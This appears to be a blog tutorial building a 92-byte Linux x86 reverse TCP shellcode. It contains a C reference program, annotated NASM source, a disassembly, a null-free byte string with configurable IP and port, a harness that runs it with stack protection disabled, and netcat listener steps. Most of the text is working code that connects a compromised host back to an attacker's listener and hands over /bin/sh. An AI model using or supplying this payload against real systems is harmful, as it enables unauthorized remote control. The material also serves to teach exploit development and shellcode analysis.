## Reverse TCP Bind Shellcode

A Linux x86 assembly language program to enable a reverse tcp connection to bind to a shell on a remote host. In a reverse connection the compromised system will run the shellcode which in turn will attempt to connect to an attackers system which is listening for said connection.

To build anything you normally need a foundation, this one being a working C language program that will do what is required. From this code it is possible to then work backwards, refining and optimising the code on the way. Comments are added to enable more complete cross referencing while reading between the differing code implementations, though the code should be fairly self explanatory. The assembly language snippets where taken, and altered slightly, from a disassembly of the binary using objdump, e.g.

*$ objdump -d reversetcpbindshellc -M intel*

Output has not been reproduced due to length and the usefulness of wasting blog space.

Note:
Socket code is among the most standard of code to be found on the internet and it seldom differs, I would be loathe to claim all code in this post as my own as it is based off research and examples found in places too numerous to mention, my feet are most defintely planted on the shoulders of giants.
```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
 
int
main(void) 
{
    int sockfd;  
    struct sockaddr_in attacker_addr;   
    socklen_t sinsize;
     
    /*
    push ecx        ; push null
    push byte 0x6   ; push IPPROTO_TCP value
    push byte 0x1   ; push SOCK_STREAM value
    push byte 0x2   ; push AF_INET
    mov ecx, esp    ; ecx contains pointer to socket() args
    int 0x80        ; make the call, eax contains sockfd                       
    mov esi, eax    ; esi now contains sockfd
    */
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
    /*
    mov bl, 0x02    ; preparation for AF_INET
    push dword 0x0a01a8c0 ; (192.168.1.10)
    push word 0x697a ; port number 31337
    push word bx    ; push AF_INET
    inc bl          ; connect()
    mov ecx, esp    ; ecx contains pointer to sockaddr struct
    push byte 0x10  ; push socklen_t addrlen
    push ecx        ; push const struct sockaddr *addr
    push esi        ; push socket file descriptor
    mov ecx, esp    ; ecx contains pointer to connect() args
    int 0x80
    */
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(31337);
    attacker_addr.sin_addr.s_addr = inet_addr("10.51.53.4");
    memset(&(attacker_addr.sin_zero),'\0',8);
    connect(sockfd, (struct sockaddr *)&attacker_addr, 
        sizeof(struct sockaddr));
 
    /*
    mov ebx, eax    ; ebx contains dupsockfd
    xor ecx, ecx    ; zero ecx register
    mov cl, 0x3     ; set counter
    dupfd:
    dec cl          ; decrement counter
    mov al, 0x3f    ; dup2()
    int 0x80        ; make the call
    jne dupfd       ; loop until 0
    */
    dup2(sockfd,0); // stdin
    dup2(sockfd,1); // stdout
    dup2(sockfd,2); // stderr
 
    /*
    push edx        ; push null
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    mov ebx, esp    ; ebx contains address of //bin/sh
    push edx        ; push null
    push ebx        ; push address of //bin/sh
    mov ecx, esp    ; ecx pointer to //bin/sh
    push edx        ; push null
    mov edx, esp    ; edx contains pointer to null
    mov al, 0xb     ; execve()
    int 0x80        ; make the call
    */
    execve("/bin/sh", NULL, NULL);
}
```
Build the code:
```
$ gcc reversetcpbindshellc.c -o reversetcpbindshellc
```
Test above executable using two systems (virtual or otherwise):
Open a terminal on the attack system,
```
$ nc -l -v 31337
```
the attack system will await a connection from the compromised system.

Open a terminal on the system to be compromised,
```
$ ./reversetcpbindshellc
```
on the attack system a connection message should now appear, shell access is now available on the compromised system. Trying typing in some commands to prove this is the case.

Using the above C program as a reference it is easier to work out what is required in the development of an assembly language equivalnet. Therefore the following program is written, from the disassembly of the C binary, to allow for use as shellcode within a exploit payload. To this end the shellcode produced is free from NULLs and is as compact as possible, or at least as compact as I can make it, for now. Extensive comments have been added to the assembly language code for study purposes.
```nasm
global _start
section .text
_start:
    ; Socket
    ; Function prototype:
    ;   int socket(int domain, int type, int protocol)
    ; Purpose:
    ;   creates an endpoint for communications, returns a
    ;   descriptor that will be used thoughout the code to
    ;   bind/listen/accept communications
    xor eax, eax    ; zero eax register
    xor ebx, ebx    ; zero ebx register
    xor ecx, ecx    ; zero ecx register
    xor edx, edx    ; zero edx register
    mov al, 0x66    ; socketcall()
    mov bl, 0x1     ; socket() call number for socketcall
    push ecx        ; push null
    push byte 0x6   ; push IPPROTO_TCP value
    push byte 0x1   ; push SOCK_STREAM value
    push byte 0x2   ; push AF_INET
    mov ecx, esp    ; ecx contains pointer to socket() args
    int 0x80
    mov esi, eax    ; esi contains socket file descriptor
    ; Connect
    ; Function protoype:
    ;   int connect(int sockfd, const struct sockaddr *addr,
    ;       socklen_t addrlen)
    ; Purpose:
    ;   initiate a connection on socket referred by the file
    ;   descriptor to the address specified in addr.
    mov al, 0x66    ; socketcall()
    xor ebx, ebx    ; zero ebx
    mov bl, 0x02    ; preparation for AF_INET
    push dword 0x0a01a8c0 ; (192.168.1.10)
    push word 0x697a ; port number 31337
    push word bx    ; push AF_INET
    inc bl          ; connect()
    mov ecx, esp    ; ecx contains pointer to sockaddr struct
    push byte 0x10  ; push socklen_t addrlen
    push ecx        ; push const struct sockaddr *addr
    push esi        ; push socket file descriptor
    mov ecx, esp    ; ecx contains pointer to connect() args
    int 0x80
    ; Dup2
    ; Function prototype:
    ;   int dup2(int oldfd, int newfd)
    ; Purpose:
    ;   duplicate a file descriptor, copies the old file
    ;   descriptor to a new one allowing them to be used
    ;   interchangably, this allows all shell ops to/from the
    ;   compomised system
    mov ebx, eax    ; ebx contains descriptor of accepted socket
    xor ecx, ecx    ; zero ecx register
    mov cl, 0x3     ; set counter
dupfd:
    dec cl          ; decrement counter
    mov al, 0x3f    ; dup2()
    int 0x80
    jne dupfd       ; loop until 0
    ; Execve
    ; Function descriptor:
    ;   int execve(const char *fn, char *const argv[],
    ;       char *const envp[])
    ; Purpose:
    ;   to execute a program on a remote and/or compromised
    ;   system. There is no return from using execve therefore
    ;   an exit syscall is not required
    xor eax, eax    ; zero eax register
    push edx        ; push null
    push 0x68732f6e ; hs/n
    push 0x69622f2f ; ib//
    mov ebx, esp    ; ebx contains address of //bin/sh
    push edx        ; push null
    push ebx        ; push address of //bin/sh
    mov ecx, esp    ; ecx pointer to //bin/sh
    push edx        ; push null
    mov edx, esp    ; edx contains pointer to null
    mov al, 0xb     ; execve()
    int 0x80
```
Build the code:
```
$ nasm -felf32 -o reversetcpbindshell.o reversetcpbindshell.asm
$ ld -o reversetcpbindshell reversetcpbindshell.o
```
Check for nulls:
```
$ objdump -D reversetcpbindshell -M intel

reversetcpbindshell:     file format elf32-i386
Disassembly of section .text:
08048060 <_start>:
 8048060:   31 c0                   xor    eax,eax
 8048062:   31 db                   xor    ebx,ebx
 8048064:   31 c9                   xor    ecx,ecx
 8048066:   31 d2                   xor    edx,edx
 8048068:   b0 66                   mov    al,0x66
 804806a:   b3 01                   mov    bl,0x1
 804806c:   51                      push   ecx
 804806d:   6a 06                   push   0x6
 804806f:   6a 01                   push   0x1
 8048071:   6a 02                   push   0x2
 8048073:   89 e1                   mov    ecx,esp
 8048075:   cd 80                   int    0x80
 8048077:   89 c6                   mov    esi,eax
 8048079:   b0 66                   mov    al,0x66
 804807b:   31 db                   xor    ebx,ebx
 804807d:   b3 02                   mov    bl,0x2
 804807f:   68 c0 a8 01 0a          push   0xa01a8c0
 8048084:   66 68 7a 69             pushw  0x697a
 8048088:   66 53                   push   bx
 804808a:   fe c3                   inc    bl
 804808c:   89 e1                   mov    ecx,esp
 804808e:   6a 10                   push   0x10
 8048090:   51                      push   ecx
 8048091:   56                      push   esi
 8048092:   89 e1                   mov    ecx,esp
 8048094:   cd 80                   int    0x80
 8048096:   89 c3                   mov    ebx,eax
 8048098:   31 c9                   xor    ecx,ecx
 804809a:   b1 03                   mov    cl,0x3
 
0804809c <dupfd>:
 804809c:   fe c9                   dec    cl
 804809e:   b0 3f                   mov    al,0x3f
 80480a0:   cd 80                   int    0x80
 80480a2:   75 f8                   jne    804809c <dupfd>
 80480a4:   31 c0                   xor    eax,eax
 80480a6:   52                      push   edx
 80480a7:   68 6e 2f 73 68          push   0x68732f6e
 80480ac:   68 2f 2f 62 69          push   0x69622f2f
 80480b1:   89 e3                   mov    ebx,esp
 80480b3:   52                      push   edx
 80480b4:   53                      push   ebx
 80480b5:   89 e1                   mov    ecx,esp
 80480b7:   52                      push   edx
 80480b8:   89 e2                   mov    edx,esp
 80480ba:   b0 0b                   mov    al,0xb
 80480bc:   cd 80                   int    0x80
```
Test above executable using two systems (virtual or otherwise):
Open a terminal on the attack system,
```
$ nc -l -v 31337
```
the attack system will await a connection from the compromised system.

Open a terminal on the system to be compromised,
```
$ ./reversetcpbindshell
```
on the attack system a connection message should now appear, shell access is now available on the compromised system. Try typing in some commands to prove this is the case.

Get shellcode from executable:
Use the following from the commandlinefu website replacing PROGRAM with the name of the required executable like so,
```bash
$ objdump -d ./reversetcpbindshell | grep ‘[0-9a-f]:’ | grep -v ‘file’ | cut -f2 -d: | cut -f1-6 -d’ ‘ | tr -s ‘ ‘ | tr ‘t’ ‘ ‘ | sed ‘s/ $//g’ | sed ‘s/ /x/g’ | paste -d ” -s | sed ‘s/^/”/’ | sed ‘s/$/”/g’

“\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68\xc0\xa8\x01\x0a\x66\x68\x7a\x69\x66\x53\xfe\xc3\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52\x89\xe2\xb0\x0b\xcd\x80”
```
The shellcode can be copied and pasted into a test program, similar to the one below. The #define IPADDR and PORT is to allow for the simple configuration of IP Address and Port.
```c	
#include <stdio.h>
 
/*
 ipaddr 192.168.1.10 (c0a8010a)
 port 31337 (7a69)
*/
#define IPADDR "\xc0\xa8\x01\x0a"
#define PORT "\x7a\x69"
 
unsigned char code[] =
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3"
"\x01\x51\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd"
"\x80\x89\xc6\xb0\x66\x31\xdb\xb3\x02\x68"
IPADDR"\x66\x68"PORT"\x66\x53\xfe\xc3"
"\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89"
"\xc3\x31\xc9\xb1\x03\xfe\xc9\xb0\x3f\xcd\x80"
"\x75\xf8\x31\xc0\x52\x68\x6e\x2f\x73\x68\x68"
"\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x52"
"\x89\xe2\xb0\x0b\xcd\x80";
 
main()
{
    printf("Shellcode Length: %dn", sizeof(code)-1);
    int (*ret)() = (int(*)())code;
    ret();
}
```
Build the code:
```
$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```
The options for gcc are to disable stack protection and enable stack execution respectively. Without these options the code will cause a segfault.

Test above executable using two systems (virtual or otherwise):
Open a terminal on the attack system,
```
$ nc -l -v 31337
```
the attack system will await a connection from the compromised system.

Open a terminal on the system to be compromised,
```
$ ./reversetcpbindshell
```
on the attack system a connection message should now appear, shell access is now available on the compromised system. Try typing in some commands to prove this is the case.

The shellcode above currently weighs in at 92 bytes. With further research the codebase could possibly be reduced, especially on architectures other than x86.


Exploit-db database entry -- http://www.exploit-db.com/exploits/25497

Shell-storm database entry -- http://shell-storm.org/shellcode/files/shellcode-849.php
